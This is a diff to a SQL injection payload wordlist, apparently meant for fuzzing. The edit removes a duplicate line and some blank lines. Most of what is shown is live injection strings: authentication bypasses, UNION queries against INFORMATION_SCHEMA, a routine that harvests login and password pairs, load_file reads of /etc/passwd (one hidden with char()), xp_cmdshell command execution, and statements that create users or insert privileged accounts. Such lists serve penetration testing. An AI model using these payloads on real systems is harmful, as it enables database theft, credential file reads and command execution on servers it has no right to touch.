@@ -21,7 +21,6 @@ Admin' OR '
 '%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
 ) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
 ' having 1=1--
-' having 1=1--
 ' group by userid having 1=1--
 ' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
 ' or 1 in (select @@version)--
@@ -49,17 +48,11 @@ UNI/**/ON SEL/**/ECT
 %27+--+&password=
 '; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
  @var select @var as var into temp end --
-
 ' and 1 in (select var from temp)--
 ' union select 1,load_file('/etc/passwd'),1,1,1;
 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
 ' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
-
-
 HaMBERGERS
-
-
-
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 CREATE USER name IDENTIFIED BY 'pass123'
 CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; 
@@ -70,3 +63,4 @@ INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSW
 GRANT CONNECT TO name; GRANT RESOURCE TO name;
 INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) 
  + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+
